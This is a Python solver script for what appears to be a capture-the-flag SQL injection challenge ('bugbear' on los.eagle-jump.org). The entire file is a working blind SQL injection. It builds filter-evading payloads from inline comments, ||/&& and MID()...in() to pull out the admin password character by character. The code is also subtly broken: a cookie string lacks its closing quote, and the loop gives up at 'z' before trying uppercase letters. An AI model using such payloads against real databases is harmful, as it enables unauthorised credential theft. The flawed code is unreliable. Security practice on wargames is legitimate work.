#!/usr/bin/python3
# coding : UTF-8

import sys
import requests
import time

def main():
    url = "https://los.eagle-jump.org/bugbear_431917ddc1dec75b4d65a23bd39689f8.php"
    ua = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36'
    headers = {'User-Agent': ua}
    cookies = dict(PHPSESSID='XXXXXXXXXXXXXXXXXXXX)

    chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
    password = ""
    for count in range(1, 11):
        for char in chars:
            val = '1||id/**/in/**/(\"admin\")&&MID(pw,{count},1)/**/in/**/(\"{char}\")'.format(count = count, char = char)
            params = {'no': val}
            response = requests.get(url, headers=headers, params=params, cookies=cookies, allow_redirects=False)
            if response.text.count("Hello admin") == 1:
                password += char
                print(password)
                break
            if char == 'z':
                print("not found")
                print(password)
                return
            time.sleep(0.1)
    print(password)

if __name__ == "__main__":
    main()
